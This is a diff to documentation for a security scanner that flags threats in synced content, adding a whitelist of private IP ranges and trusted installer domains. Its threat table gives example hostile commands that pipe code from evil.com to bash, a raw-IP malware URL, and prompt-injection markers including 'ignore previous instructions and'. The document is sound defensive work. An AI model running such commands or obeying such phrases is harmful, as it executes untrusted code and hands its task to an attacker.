@@ -39,11 +39,28 @@ Threats are logged to `~/.openclaw/security-scan.log` (overwritten each sync). F
 | Threat Type | Description | Example |
 |-------------|-------------|---------|
 | `base64-exec` | Base64-decoded content piped to shell | `base64 -D \| bash` |
-| `pipe-to-shell` | curl/wget output piped directly to shell | `curl https://evil.com/script \| bash` |
-| `cmd-substitution` | Command substitution executing downloaded code | `$(curl https://evil.com/payload)` |
-| `raw-ip-url` | URLs using raw IP addresses instead of domains | `http://91.92.242.30/malware` |
-| `executable-url` | URLs pointing to executable/archive files | `https://example.com/setup.exe`, `.zip`, `.dmg` |
+| `pipe-to-shell` | curl/wget output piped directly to shell (untrusted) | `curl https://evil.com/script \| bash` |
+| `cmd-substitution` | Command substitution executing downloaded code (untrusted) | `$(curl https://evil.com/payload)` |
+| `raw-ip-url` | URLs using public raw IP addresses | `http://91.92.242.30/malware` |
+| `executable-url` | URLs pointing to executable/archive files (untrusted) | `https://evil.com/setup.exe`, `.zip`, `.dmg` |
 | `prompt-injection` | Fake instructions targeting AI agents | `Setup-Wizard:`, `ignore previous instructions and` |
+
+### Whitelisted (not flagged)
+
+To reduce false positives in documentation, the scanner whitelists:
+
+**Private/Local IPs** (commonly used in docs examples):
+- `127.x.x.x` (localhost)
+- `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x` (RFC 1918 private)
+- `100.64-127.x.x` (CGNAT/Tailscale)
+
+**Trusted shell installer domains**:
+- `openclaw.ai`, `tailscale.com`, `bun.sh`
+- `deb.nodesource.com`, `get.docker.com`
+- `raw.githubusercontent.com/Homebrew/`, `raw.githubusercontent.com/openclaw/`
+
+**Trusted executable download domains**:
+- `dl.google.com`, `github.com`, `openclaw.ai`
 
 ### Prompt injection patterns detected
 
